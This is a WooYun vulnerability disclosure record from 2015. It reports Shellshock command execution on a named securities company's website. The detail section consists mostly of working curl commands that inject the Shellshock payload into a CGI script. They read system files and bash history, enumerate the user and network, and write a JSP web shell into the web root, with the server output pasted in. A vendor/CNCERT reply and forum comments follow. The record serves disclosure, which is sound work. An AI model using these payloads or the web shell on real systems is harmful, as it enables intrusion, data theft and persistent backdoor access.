{"id": 66357, "wybug_id": "wooyun-2015-0139783", "wybug_title": "神器而已证券系列之国开证券重要站点任意系统命令执行(可影响内网安全)", "wybug_corp": "国开证券", "wybug_author": "举起手来", "wybug_date": "2015-09-10 18:20", "wybug_open_date": "2015-10-26 10:46", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向公众公开  简要描述： RT，任意系统命令执行，威胁直达主站 详细说明：  \ncurl -H \"xxx: () { ignored; }; echo Content-Type: text/plain ; echo ;/bin/cat /etc/issue\" http://www.gkzq.com.cn/cgi-bin/test-cgiRed Hat Enterprise Linux Server release 5.7 (Tikanga)Kernel \\r on an \\m\n查看了下自身的用户\ncurl -H \"xxx: () { ignored; }; echo Content-Type: text/plain ; echo ;/usr/bin/whoami\"  http://www.gkzq.com.cn/cgi-bin/test-cgiweblogic\n发现是weblogic，估计也不是root组了\ncurl -H \"xxx: () { ignored; }; echo Content-Type: text/plain ; echo ;/usr/bin/id\"  http://www.gkzq.com.cn/cgi-bin/test-cgiuid=1000(weblogic) gid=1000(weblogic) groups=1000(weblogic)\n   漏洞证明：  习惯性的查看了下IP地址.发现还是内网\ncurl -H \"xxx: () { ignored; }; echo Content-Type: text/plain ; echo ;/sbin/ifconfig\" http://www.gkzq.com.cn/cgi-bin/test-cgibond0     Link encap:Ethernet  HWaddr AC:16:2D:8A:01:F8          inet addr:10.200.3.4  Bcast:10.200.3.15  Mask:255.255.255.240          UP BROADCAST RUNNING MASTER MULTICAST  MTU:1500  Metric:1          RX packets:3203379937 errors:0 dropped:0 overruns:0 frame:2          TX packets:4834148049 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:830582707308 (773.5 GiB)  TX bytes:3638374711428 (3.3 TiB)eth0      Link encap:Ethernet  HWaddr AC:16:2D:8A:01:F8          UP BROADCAST RUNNING SLAVE MULTICAST  MTU:1500  Metric:1          RX packets:3203379937 errors:0 dropped:0 overruns:0 frame:2          TX packets:4834148049 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:830582707308 (773.5 GiB)  TX bytes:3638374711428 (3.3 TiB)          Interrupt:83 Memory:f6bf0000-f6c00000eth1      Link encap:Ethernet  HWaddr AC:16:2D:8A:01:F8          UP BROADCAST SLAVE MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)          Interrupt:91 Memory:f6bc0000-f6bd0000lo        Link encap:Local Loopback          inet addr:127.0.0.1  Mask:255.0.0.0          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:3800316349 errors:0 dropped:0 overruns:0 frame:0          TX packets:3800316349 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:773668241712 (720.5 GiB)  TX bytes:773668241712 (720.5 GiB)\n既然用户是weblogic,还可以执行命令，查看了下/home/weblogic/.bash_history\ncurl -H \"xxx: () { ignored; }; echo Content-Type: text/plain ; echo ;/bin/cat /home/weblogic/.bash_history\"  http://www.gkzq.com.cn/cgi-bin/test-cgillcd -vi jjrServer.jspcd -cd ..rzcd ../wsyyt/vi xxgs_jjr.jspcd /opt/bea/user_projects/xxxxxxxxxxx/xxxxxxxxx/newback.war/llcd /opt/bea/user_projects/xxxxxxxxxxx/xxxxxxxxx/gkzq.war/wsyyt/server/vi jjrListServer.jsp....................\n得到了网站的物理路径，然后百度出真实地址，再顺手写了一个小马进去\ncurl -H \"xxx: () { ignored; }; echo Content-Type: text/plain ; echo ;/bin/echo '<%if(request.getParameter(\\\"f\\\")!=null)(new java.io.FileOutputStream(application.getRealPath(\\\"/\\\")+request.getParameter(\\\"f\\\"))).write(request.getParameter(\\\"t\\\").getBytes());%>ok'>/opt/bea/user_projects/XXXXXX/XXXXXXX/gkzq.war/wsyyt/wooyun.jsp\"  http://www.gkzq.com.cn/cgi-bin/test-cgi\nhttp://www.gkzq.com.cn/gkzq/wsyyt/wooyun.jsp 随时可以到内部\n\n不再深入~记得删除   修复方案：     版权声明：转载请注明来源 举起手来@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-09-11 10:44 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向证券业信息化主管部门通报,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-08 18:23 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  mark.组队不？    \n     2015-09-08 20:17 |    \t\t不会游泳的鱼 \t\t\t( 普通白帽子  |\t\t\t        Rank:124 漏洞数:38        | 非著名白帽子)\t\t \n  这根本停不下来了    \n     2015-09-08 23:21 |    \t\tredare \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:13        )\t\t \n  猪猪侠你好    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}